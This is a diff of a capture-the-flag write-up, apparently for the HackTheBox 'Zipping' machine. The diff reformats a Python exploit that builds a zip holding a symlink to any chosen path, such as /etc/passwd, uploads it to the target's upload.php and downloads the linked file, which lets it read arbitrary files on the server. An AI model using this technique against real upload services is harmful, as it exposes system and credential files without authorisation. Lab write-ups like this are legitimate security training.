@@ -51,39 +51,39 @@ so for example if i create this file:
 and upload on the server i will see its /etc/passwd
 i like to automate stuff so i've written this python code to se the file i want:
 	
-	'''	
-	#!/bin/env python3
+```pytohn3	
+#!/bin/env python3
 
-	import os
-	import requests
-	import sys
-	import subprocess
-	from time import sleep
+import os
+import requests
+import sys
+import subprocess
+from time import sleep
 
-	url = "http://zipping.htb/"
+url = "http://zipping.htb/"
 
-	os.system(f"rm test.zip")
-	os.system(f"rm file.pdf")
+os.system(f"rm test.zip")
+os.system(f"rm file.pdf")
 
-	path = input("inserisci la path da leggere: ")
-	filename = 'file.pdf'
+path = input("inserisci la path da leggere: ")
+filename = 'file.pdf'
 
-	os.system(f"ln -s {path} {filename}")
-	os.system(f"zip --symlinks test.zip {filename}")
+os.system(f"ln -s {path} {filename}")
+os.system(f"zip --symlinks test.zip {filename}")
 
-	#creo l'oggetto file da inviare
-	files = {"zipFile": ('test.zip', open('test.zip', 'rb'), 'application/zip')}
-	#invio la richiesta post all'endpoint
-	os.system('curl -s http://zipping.htb/upload.php -F "zipFile=@./test.zip;type=application/zip" -F "submit=Submit" > /dev/null 2>&1')
+#creo l'oggetto file da inviare
+files = {"zipFile": ('test.zip', open('test.zip', 'rb'), 'application/zip')}
+#invio la richiesta post all'endpoint
+os.system('curl -s http://zipping.htb/upload.php -F "zipFile=@./test.zip;type=application/zip" -F "submit=Submit" > /dev/null 2>&1')
 
-	print("[*]File uploaded\n")
-	#prendo l'hash md5 del file
-	file_md5sum = subprocess.check_output("md5sum test.zip", shell=True, text=True)[:32]
-	#get the file from the server
-	os.system(f'curl "{url}uploads/{file_md5sum}/{filename}"')
+print("[*]File uploaded\n")
+#prendo l'hash md5 del file
+file_md5sum = subprocess.check_output("md5sum test.zip", shell=True, text=True)[:32]
+#get the file from the server
+os.system(f'curl "{url}uploads/{file_md5sum}/{filename}"')
 
-	print("\n[*]Exploit by Disturbante")
-	'''
+print("\n[*]Exploit by Disturbante")
+```
 this code create the sym link with the path u write, create a zip folder, compute the md5 of the folder,
 upload the file and visit the url created.
 
